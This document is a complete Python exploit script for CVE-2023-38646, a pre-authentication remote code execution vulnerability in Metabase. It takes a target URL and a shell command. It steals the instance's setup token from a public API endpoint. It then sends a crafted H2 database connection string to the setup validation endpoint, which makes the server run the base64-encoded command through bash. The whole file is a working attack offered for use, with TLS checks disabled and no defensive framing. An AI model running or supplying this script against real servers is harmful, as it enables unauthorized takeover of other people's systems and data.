#!/bin/env python3
import sys
import requests
import argparse
import traceback
import json
import base64
import random
import urllib3
from string import ascii_uppercase
from typing import Optional, Dict, Any

EXIT_FAILURE = 1
EXIT_SUCCESS = 0

def parse_args() -> argparse.Namespace:
    parser: argparse.ArgumentParser = argparse.ArgumentParser("Exploit for CVE-2023-38646, a pre-auth RCE vulnerability in Metabase open-source edition < 0.46.6.1 and Metabase enterprise edition < 1.46.6.1")
    parser.add_argument("-t", "--target", required=True, type=str, help="URL of target Metabase instance, with protocol")
    parser.add_argument("-c", "--command", required=True, type=str, help="Command to execute on the target machine")
    return parser.parse_args()

def get_setup_token(target: str) -> Optional[str]:
    url: str = target + "/api/session/properties"
    try:
        response: requests.Response = requests.get(url, timeout=10, verify=False)
    except Exception as e:
        print(traceback.format_exc())
        return None

    if response.status_code != 200:
        print(f"[!] GET request to {url} failed with status code {response.status_code}")
        return None

    try:
        properties_json = json.loads(response.text)
    except json.decoder.JSONDecodeError:
        print(f"[!] GET request to {url} returned invalid JSON:\n{response.text}")
        return None

    try:
        return properties_json['setup-token']
    except (KeyError, TypeError, IndexError):
        print("[!] Setup token was not found in response JSON")
        return None

def exploit(target: str, setup_token: str, command: str) -> bool:
    url: str = target + "/api/setup/validate"
    command_bytes: bytes = command.encode('utf-8')
    padded_command_bytes: bytes = command_bytes + (b" " * (3-len(command_bytes) % 3))
    encoded_command: str = base64.b64encode(padded_command_bytes).decode("utf-8")
    random_trigger_name: str = ''.join([random.choice(ascii_uppercase) for i in range(12)])
    headers: Dict[str, str] = {
        "Content-Type": "application/json",
        "Connection": "close"
    }
    payload: Dict[str, Any] = {
        "token": setup_token,
        "details": {
            "details": {
                "db": f"zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_trigger_name} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{encoded_command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                "advanced-options": False,
                "ssl": True
            },
            "name": "x",
            "engine": "h2"
        }
    }
    try:
        response: requests.Response = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)
    except Exception as e:
        print(traceback.format_exc())
        return False

    if response.status_code != 400:
        # Might fail even if the exploit succeeds
        print(f"[!] POST request to {url} returned unexpected status code {response.status_code}")
        return False
    
    return True



def main() -> int:
    args: argparse.Namespace = parse_args()
    setup_token: Optional[str] = get_setup_token(args.target)

    if setup_token is None:
        print("[!] Could not obtain setup token.")
        return EXIT_FAILURE

    if not exploit(args.target, setup_token, args.command):
        print("[!] Failed to exploit target (probably...)")
        return EXIT_SUCCESS

    print("[+] Exploitation request successful")
    return EXIT_SUCCESS

if __name__ == "__main__":
    # Get rid of insecure request warnings
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    sys.exit(main())
